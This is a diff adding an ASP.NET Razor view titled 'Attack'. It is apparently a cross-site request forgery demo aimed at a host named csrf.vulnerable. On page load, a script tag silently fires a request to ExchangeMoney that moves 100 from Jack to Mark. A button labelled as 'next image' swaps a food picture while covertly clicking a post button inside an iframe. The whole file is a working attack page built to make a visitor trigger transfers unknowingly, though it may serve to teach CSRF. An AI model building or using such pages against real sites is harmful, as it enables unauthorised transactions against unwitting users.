@@ -1,0 +1,20 @@
+﻿
+@{
+    ViewBag.Title = "Attack";
+}
+<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+<script>
+    $(function () {
+        $("#next").click(function () {
+            $("#foodImg").attr('src', '/Images/food2.jpg')
+            $("iframe").contents().find("#postBtn").click()
+        });
+    });
+</script>
+<script type="text/javascript" src="http://csrf.vulnerable/Home/ExchangeMoney?fromWho=Jack&toWho=Mark&Money=100"></script>
+<h2>Attack</h2>
+<img id="foodImg" src="~/Images/food1.jpg" />
+<input id="next" type="button" value="下一張" />
+<iframe src="/Home/PostAttack" frameborder="0">
+
+</iframe>
